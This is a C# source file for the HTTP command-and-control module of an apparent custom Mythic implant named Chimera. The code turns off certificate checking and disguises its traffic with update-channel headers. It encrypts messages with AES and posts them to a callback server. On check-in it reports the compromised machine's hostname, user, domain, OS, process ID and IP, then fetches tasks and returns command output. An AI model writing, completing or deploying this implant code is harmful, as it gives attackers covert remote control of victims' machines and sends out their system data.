using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;

namespace Chimera
{
    public static class C2Http
    {
        private static readonly HttpClient Client = CreateClient();

        private static HttpClient CreateClient()
        {
            var handler = new HttpClientHandler();
            handler.ServerCertificateCustomValidationCallback =
                (msg, cert, chain, errors) => true;
            var client = new HttpClient(handler);
            client.DefaultRequestHeaders.Add("User-Agent", Config.UserAgent);
            client.DefaultRequestHeaders.Add("Accept", "application/json");
            client.DefaultRequestHeaders.Add("X-Update-Channel", "stable");
            return client;
        }

        private static byte[] GetAESKey()
        {
            using (var sha = SHA256.Create())
                return sha.ComputeHash(Encoding.UTF8.GetBytes(Config.PayloadUUID));
        }

        // Mythic v3 wire format:
        // Base64( UUID[36 bytes] + IV[16 bytes] + AES-CBC(plaintext) )
        public static string Encrypt(string plaintext)
        {
            byte[] key = GetAESKey();
            byte[] iv  = new byte[16];
            using (var rng = new RNGCryptoServiceProvider())
                rng.GetBytes(iv);

            using (var aes = Aes.Create())
            {
                aes.Key     = key;
                aes.IV      = iv;
                aes.Mode    = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var enc = aes.CreateEncryptor())
                {
                    byte[] plainBytes  = Encoding.UTF8.GetBytes(plaintext);
                    byte[] cipherBytes = enc.TransformFinalBlock(plainBytes, 0, plainBytes.Length);

                    byte[] uuidBytes = Encoding.UTF8.GetBytes(Config.PayloadUUID);
                    byte[] combined  = new byte[uuidBytes.Length + iv.Length + cipherBytes.Length];

                    Buffer.BlockCopy(uuidBytes, 0, combined, 0, uuidBytes.Length);
                    Buffer.BlockCopy(iv, 0, combined, uuidBytes.Length, iv.Length);
                    Buffer.BlockCopy(cipherBytes, 0, combined, uuidBytes.Length + iv.Length, cipherBytes.Length);

                    return Convert.ToBase64String(combined);
                }
            }
        }

        // Mythic response format:
        // Base64( UUID[36 bytes] + IV[16 bytes] + AES-CBC(plaintext) )
        public static string Decrypt(string base64Ciphertext)
        {
            byte[] key      = GetAESKey();
            byte[] combined = Convert.FromBase64String(base64Ciphertext);

            // Skip first 36 bytes (UUID Mythic prepends)
            byte[] iv          = new byte[16];
            byte[] cipherBytes = new byte[combined.Length - 36 - 16];

            Buffer.BlockCopy(combined, 36, iv, 0, 16);
            Buffer.BlockCopy(combined, 52, cipherBytes, 0, cipherBytes.Length);

            using (var aes = Aes.Create())
            {
                aes.Key     = key;
                aes.IV      = iv;
                aes.Mode    = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var dec = aes.CreateDecryptor())
                {
                    byte[] plainBytes = dec.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
                    return Encoding.UTF8.GetString(plainBytes);
                }
            }
        }

        public static string Send(string jsonMessage)
        {
            try
            {
                string encrypted = Encrypt(jsonMessage);
                var content      = new StringContent(encrypted, Encoding.UTF8, "application/json");
                var response     = Client.PostAsync(Config.CallbackURL, content)
                                         .GetAwaiter().GetResult();
                string body      = response.Content.ReadAsStringAsync()
                                           .GetAwaiter().GetResult();
                return Decrypt(body);
            }
            catch { return null; }
        }

        public static string CheckIn()
        {
            string hostname = Dns.GetHostName();
            string username = Environment.UserName;
            string os       = Environment.OSVersion.ToString();
            int    pid      = System.Diagnostics.Process.GetCurrentProcess().Id;
            string arch     = Environment.Is64BitProcess ? "x64" : "x86";
            string domain   = Environment.UserDomainName;

            string json = $@"{{
                ""action"": ""checkin"",
                ""uuid"": ""{Config.PayloadUUID}"",
                ""ips"": [""{GetLocalIP()}""],
                ""os"": ""{os}"",
                ""user"": ""{domain}\\{username}"",
                ""host"": ""{hostname}"",
                ""pid"": {pid},
                ""architecture"": ""{arch}"",
                ""domain"": ""{domain}"",
                ""integrity_level"": 2,
                ""external_ip"": """"
            }}";

            return Send(json);
        }

        public static string GetTasking(string callbackUUID)
        {
            string json = $@"{{
                ""action"": ""get_tasking"",
                ""tasking_size"": 1,
                ""uuid"": ""{callbackUUID}""
            }}";
            return Send(json);
        }

        public static string PostResponse(string callbackUUID, string taskID, string output)
        {
            string escaped = output
                .Replace("\\", "\\\\")
                .Replace("\"", "\\\"")
                .Replace("\r", "\\r")
                .Replace("\n", "\\n");

            string json = $@"{{
                ""action"": ""post_response"",
                ""uuid"": ""{callbackUUID}"",
                ""responses"": [{{
                    ""task_id"": ""{taskID}"",
                    ""user_output"": ""{escaped}"",
                    ""completed"": true
                }}]
            }}";
            return Send(json);
        }

        private static string GetLocalIP()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList)
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        return ip.ToString();
            }
            catch { }
            return "127.0.0.1";
        }
    }
}
